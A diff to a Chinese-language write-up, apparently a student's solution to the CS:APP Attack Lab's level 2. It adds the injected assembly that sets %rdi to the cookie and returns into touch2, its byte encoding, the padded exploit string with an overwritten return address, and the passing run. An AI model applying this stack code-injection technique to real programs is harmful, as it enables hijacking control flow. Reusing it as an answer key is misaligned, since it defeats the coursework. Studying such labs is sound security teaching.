@@ -224,7 +224,11 @@ void touch2(unsigned val) {
 0x5561dc98:     0x0000000000000000      0x00000000004017c0
 ```
 
-下面来看一下我们需要执行的代码应该怎么写，这里需要就 `val` 设置成 `cookie` 的值，可以简单地将 level1 中 `touch1` 的地址修改为 `touch2` 即执行到 `touch2` 中，然后通过 `x 0x6044e4` 发现 `cookie` 的值为 `0x59b997fa`，所以只需要把 `%rdi` 设置成 `cookie` 值即可，要写入的代码如下
+下面来看一下我们需要执行的代码应该怎么写，这里需要就 `val` 设置成 `cookie` 的值，那么如何找到 `cookie` 的值呢？
+
+可以运行到 `touch2` 然后打断点，简单地将 level1 中 `touch1` 的地址修改为 `touch2` 即执行到 `touch2` 中，然后通过在 gdb 中运行 `x 0x6044e4` 发现 `cookie` 的值为 `0x59b997fa`，所以只需要把 `%rdi` 设置成 `cookie` 值即可。
+
+所以要执行的代码就是设置 `val` 的值，即为 `touch2` 函数的第一个参数，对应寄存器为 `$rdi`，接着再执行 `touch2` 函数，这里可以首先将 `touch2` 的地址压到栈里面，执行完指令之后，通过 `retq` 就可以执行这个压栈地址对应的 procedure，这种方式相对来说最简单，那么对应的代码如下
 
 ```js
 pushq $0x4017ec
@@ -232,7 +236,49 @@ movq $0x59b997fa,%rdi
 ret
 ```
 
+将这个文件保存为 `example.s`，然后通过下面的方式，首先 assemble 这个文件，然后 disassemble 它
+
+```shell
+unix> gcc -s example.s
+unix> objdump -d example.o > example.d
+```
+
+这样就可以得到 `example.d` 的文件如下
+
+```js
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	68 ec 17 40 00       	pushq  $0x4017ec
+   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   c:	c3                   	retq   
+```
+
+从上面的代码中就可以看出，对应的 3 个汇编指令的字节码，比如第一个 `pushq` 的字节码就是 `68 ec 17 40 00`，最终写入的 txt 文本为
+
+```txt
+68 ec 17 40 00
+48 c7 c7 fa 97 b9 59
+c3
+00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00
+78 dc 61 55
+```
+
+中间的 `00` 是为了填充空白的内存，最后在栈顶将返回的地址替换成 `0x5561dc78`，这样就会执行写入字符串的 3 个指令，接着再执行 `touch2`。
+
+```shell
+./hex2raw -i ctarget.2.txt| ./ctarget -q 
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+```
+
 #### 0x1.3 Level 3
+
 
 ### 0x2 Return-Oriented Programming
 
